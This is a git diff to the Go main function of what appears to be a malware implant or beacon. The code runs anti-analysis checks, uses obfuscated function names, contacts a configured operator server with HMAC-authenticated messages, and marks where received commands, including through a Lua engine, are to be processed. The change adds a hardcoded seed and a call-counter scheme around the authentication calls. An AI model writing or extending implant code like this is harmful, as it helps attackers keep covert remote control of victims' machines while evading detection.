@@ -77,6 +77,11 @@ func main() {
 		makefile needs adjusting to determine if listeners use compression/auth
 		and the paths they use, otherwise can get out of sync
 	*/
+
+	seed := "supersecretseedvalue"
+	secureFunc := shared.NewSecureFunction(seed)
+	initCouner := secureFunc.Counter
+
 	anti.TimingCheck()
 	anti.KillTheChild()
 	switch BB23598623() {
@@ -86,6 +91,7 @@ func main() {
 		goto XXSFDgs12
 	case false:
 		if BB176245(42) {
+			initCouner++
 			// Load configuration from embedded data
 			conf, err := shared.LoadConfig()
 			if err != nil {
@@ -102,7 +108,9 @@ func main() {
 				postUrl := ""
 				postUrl = conf.Method + "://" + conf.Host + ":" + conf.Port + conf.PostPath
 
-				token, timestamp := shared.GenerateAuthToken(CompUUID, conf.Psk2)
+				callKey := shared.ProtectedCaller(seed, initCouner)
+
+				token, timestamp := secureFunc.GenerateAuthToken(CompUUID, conf.Psk2, callKey)
 
 				//reqURL, _ := url.Parse(baseUrl)
 
@@ -172,7 +180,9 @@ func main() {
 					fmt.Println("Decoded string:", decoded)
 
 					// Verify the message with the received HMAC
-					if shared.VerifyMessageWithHMAC(data.Message, data.Key, []byte(conf.Psk1)) {
+					initCouner++
+					callKey := shared.ProtectedCaller(seed, initCouner)
+					if secureFunc.VerifyMessageWithHMAC(data.Message, data.Key, callKey, []byte(conf.Psk1)) {
 						fmt.Println("HMAC is valid!")
 						// Here is where command processing should occur
 						// A switch statement to run through possible command options, including using the lua engine
@@ -251,7 +261,9 @@ func main() {
 					//fmt.Println("Decoded string:", decoded)
 
 					// Verify the message with the received HMAC
-					switch shared.VerifyMessageWithHMAC(data.Message, data.Key, []byte(conf.Psk1)) {
+					initCouner++
+					callKey := shared.ProtectedCaller(seed, initCouner)
+					switch secureFunc.VerifyMessageWithHMAC(data.Message, data.Key, callKey, []byte(conf.Psk1)) {
 					case true:
 						fmt.Println("HMAC is valid!")
 						// Here is where command processing should occur
